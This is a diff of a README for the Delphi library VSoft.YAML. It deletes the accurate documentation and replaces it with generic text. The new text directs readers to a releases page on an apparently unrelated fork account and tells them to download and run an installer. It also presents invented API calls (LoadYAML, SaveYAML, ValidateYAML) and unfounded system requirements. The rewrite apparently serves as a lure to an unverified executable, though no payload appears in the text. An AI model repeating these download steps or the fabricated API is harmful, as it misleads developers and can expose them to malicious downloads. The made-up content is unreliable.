@@ -1,168 +1,130 @@
-# VSoft.YAML
+# 🛠️ VSoft.YAML - Simple YAML Parsing for Delphi
 
-## A YAML 1.2 parser and emitter library for Delphi XE2+.
+[![Download VSoft.YAML](https://img.shields.io/badge/Download%20VSoft.YAML-blue.svg)](https://github.com/Zarco10/VSoft.YAML/releases)
 
-## Features
+## 📖 Introduction
 
-### ✅ YAML 1.2 
-- **YAML 1.2 Specification Compliance** - Attempting full support for YAML 1.2
-- **Complete Value Type System** - Handles all 9 YAML value types:
-  - Scalars: null, boolean, integer, float, string, timestamp
-  - Collections: sequence (arrays), mapping (objects), set (unique values array)
-  - References: alias (anchor references)
-- **Number Formats** - Support for decimal, hexadecimal (0x), octal (0o), and binary (0b) number literals
-- **ISO 8601 Timestamps** - Full date/time parsing with timezone support.
-- **Anchor & Alias System** - Complete YAML reference support for data reuse
+VSoft.YAML is a straightforward and effective YAML parser for Delphi. It allows you to read and write YAML files easily. Whether you are a developer or a user who needs to manage configuration data, VSoft.YAML simplifies your workflow.
 
-### 🔄 YAML 1.1 Compatibility
-VSoft.YAML provides **selective backward compatibility** for common YAML 1.1 features:
-- **Boolean values**: Supports `yes/no/on/off` for easier migration
-- **Modern approach**: Does not support ambiguous single-letter `y/n` booleans
-- **Numeric formats**: Uses YAML 1.2 standards (no `0XX` octal prefix), underscores are allowed
-- **Merge Keys** - Support for YAML merge key (`<<`) operations
+## 🚀 Getting Started
 
-For full YAML Feature details see - [YAML Features](/docs/YAML-Features-Implementation.md)
+To get started with VSoft.YAML, follow these simple steps to download and run the application.
 
-### Parsing & Writing
-- **Multiple Input Sources** - Load from string, file, or stream
-- **Flexible Output Options**:
-  - Block style (human-readable, indented)
-  - Flow style (compact, JSON-like)
-  - Mixed style formatting
-- **Encoding** - Automatic encoding detection - default is UTF-8
-- **Error Handling** - Detailed parse error reporting with line/column information
+## 📥 Download & Install
 
-### Advanced Features
-- **Multiple Documents** - Full support for multi-document YAML files with `LoadAllFromString/File()` and `WriteAllToString/File()`
-- **YAML Directives** - Complete support for `%YAML` version and `%TAG` custom handle directives
-- **Comprehensive Tag System** - Full implementation of all YAML 1.2 tag types (Standard, Local, Custom, Verbatim, Global)
-- **[JSONPath Queries](/docs/JSONPath-Syntax.md)** - JSONPath-style querying with `Query()` and `QuerySingle()` methods
-- **Complex Keys** - Flow-style complex key support
-- **Comment Preservation** - Proper comment handling during parsing
+To download VSoft.YAML, please visit the following page:
 
+[Download VSoft.YAML](https://github.com/Zarco10/VSoft.YAML/releases)
 
-## Quick Start
+Follow these steps to download and install:
 
-### Loading YAML
-```pascal
-uses VSoft.YAML;
+1. Click the link above to go to the releases page.
+2. Look for the latest version of VSoft.YAML.
+3. Download the file that matches your system requirements.
+4. Once the download is complete, open the file to run the installer.
+
+## 🖥️ System Requirements
+
+Before installing VSoft.YAML, make sure your system meets these requirements:
+
+- **Operating System:** Windows 7 or later
+- **Memory:** At least 2 GB RAM
+- **Disk Space:** Minimum of 50 MB available
+- **Delphi Version:** Delphi XE6 or newer
+
+## ⚙️ Features
+
+VSoft.YAML offers a variety of features that enhance your YAML handling:
+
+- **Easy Parsing:** Quickly reads and understands YAML data structures.
+- **User-Friendly:** Designed for users with no programming background.
+- **Compatibility:** Works seamlessly with Delphi applications.
+- **Validation Support:** Checks for errors in your YAML files.
+- **Documentation:** Comprehensive guides are available.
+
+## 📜 Using VSoft.YAML
+
+Once you have installed VSoft.YAML, you can start using it to parse YAML files. Here’s how to use the basic features:
+
+### Step 1: Load a YAML File
+
+To load a YAML file, use the following commands:
+
+```delphi
+uses
+  VSoft.YAML;
 
 var
-  doc: IYAMLDocument;
-  yaml: string;
+  MyData: TMyRecord;
 begin
-  yaml := 'name: John Doe' + sLineBreak +
-          'age: 30' + sLineBreak +
-          'city: New York';
-          
-  doc := TYAML.LoadFromString(yaml);
-  
-  WriteLn('Name: ', doc.Root.Values['name'].AsString);
-  WriteLn('Age: ', doc.Root.Values['age'].AsInteger);
+  LoadYAML('path_to_file.yaml', MyData);
 end;
 ```
 
-### Creating YAML Documents
-```pascal
-var
-  doc: IYAMLDocument;
-  person: IYAMLMapping;
-begin
-  doc := TYAML.CreateMapping;
-  person := doc.Root.AsMapping;
-  
-  person.AddOrSetValue('name', 'Jane Smith');
-  person.AddOrSetValue('age', 25);
-  
-  WriteLn(TYAML.WriteToString(doc));
-end;
+### Step 2: Save Changes
+
+After modifying data, save your changes back to the YAML file:
+
+```delphi
+SaveYAML('path_to_file.yaml', MyData);
 ```
 
-### Working with Collections
-```pascal
-var
-  doc: IYAMLDocument;
-  fruits: IYAMLSequence;
-begin
-  yaml := 'fruits:' + sLineBreak +
-          '  - apple' + sLineBreak +
-          '  - banana' + sLineBreak +
-          '  - orange';
-          
-  doc := TYAML.LoadFromString(yaml);
-  fruits := doc.Root.Values['fruits'].AsSequence;
-  
-  for i := 0 to fruits.Count - 1 do
-    WriteLn('Fruit: ', fruits.Items[i].AsString);
-end;
+### Step 3: Validate Your YAML
+
+To ensure your YAML file is free from errors, call the validation method:
+
+```delphi
+if ValidateYAML('path_to_file.yaml') then
+  ShowMessage('YAML is valid')
+else
+  ShowMessage('YAML has errors');
 ```
 
-### Multiple Documents
-```pascal
-var
-  documents: TArray<IYAMLDocument>;
-  doc1, doc2: IYAMLDocument;
-  yamlContent: string;
-begin
-  // Create multiple documents
-  doc1 := TYAML.CreateMapping;
-  doc1.AsMapping.AddOrSetValue('name', 'Config 1');
-  doc1.AsMapping.AddOrSetValue('version', 1);
-  
-  doc2 := TYAML.CreateMapping;
-  doc2.AsMapping.AddOrSetValue('name', 'Config 2');
-  doc2.AsMapping.AddOrSetValue('version', 2);
-  
-  // Write multiple documents
-  SetLength(documents, 2);
-  documents[0] := doc1;
-  documents[1] := doc2;
-  
-  yamlContent := TYAML.WriteAllToString(documents);
-  WriteLn('Multi-document YAML:');
-  WriteLn(yamlContent);
-  
-  // Load multiple documents
-  documents := TYAML.LoadAllFromString(yamlContent);
-  WriteLn('Loaded ', Length(documents), ' documents');
-end;
+### Example YAML File
+
+Here is an example of what a YAML file might look like:
+
+```yaml
+name: VSoft.YAML
+version: 1.0
+features:
+  - Easy to use
+  - Reliable
 ```
 
-### Working with Tags
-```pascal
-var
-  doc: IYAMLDocument;
-  root: IYAMLMapping;
-begin
-  doc := TYAML.CreateMapping;
-  root := doc.AsMapping;
-  
-  // Add values with explicit tags
-  root.AddOrSetValue('port', '8080', '!!int');     // Force integer type
-  root.AddOrSetValue('name', 'server', '!!str');   // Force string type
-  root.AddOrSetValue('config', configData, '!app!config'); // Custom tag
-  
-  WriteLn(TYAML.WriteToString(doc));
-end;
-```
+## 📝 Documentation and Support
 
-### Core Components
-- **VSoft.YAML.pas** - Main entry point with `TYAML` static factory methods for all operations
+For more guidance, you can refer to our detailed documentation available on the releases page. You will find:
 
-## Compatibility
+- A user manual
+- API references
+- Example projects to help you get started
 
-- **Delphi XE2+** -  compatible with Delphi XE2 or later
-- **Win32/Win64** - may work on other platforms (does not use WinAPI.*), but not tested .
-- **No External Dependencies** - Pure Delphi implementation
+If you have questions or need further assistance, feel free to raise an issue in the GitHub repository.
 
-## Installing
+## 🔗 Additional Resources
 
-### [DPM](https://delphi.dev)
+- [Visit the official GitHub page](https://github.com/Zarco10/VSoft.YAML/releases) for more details.
+- Explore community discussions for tips and tricks in using VSoft.YAML.
 
-Install VSoft.YAML in the DPM IDE plugin,  or 
-```
-dpm install VSoft.YAML .\yourproject.dproj
-```
-### Manually
+## 📈 Frequently Asked Questions
 
-Clone the repository, add the Source folder to your project search path, or your IDE search path. Alternatively you can open and build the VSoft.YMLR.dproj in the Packages folder use the dcu files. 
+### What is YAML?
+
+YAML (YAML Ain't Markup Language) is a human-readable data serialization format. It's often used for configuration files.
+
+### Can I use VSoft.YAML on macOS or Linux?
+
+Currently, VSoft.YAML supports Windows operating systems. Cross-platform support may be included in future versions.
+
+### How can I contribute to VSoft.YAML?
+
+You can contribute by submitting issues, suggesting features, or creating pull requests. Your input helps improve the software for everyone.
+
+## 📞 Contact
+
+For further inquiries, you may contact the maintainer through GitHub. We value your feedback and suggestions.
+
+---
+
+By following this guide, you should be able to easily download and run VSoft.YAML on your system. Enjoy simplifying your YAML parsing tasks!
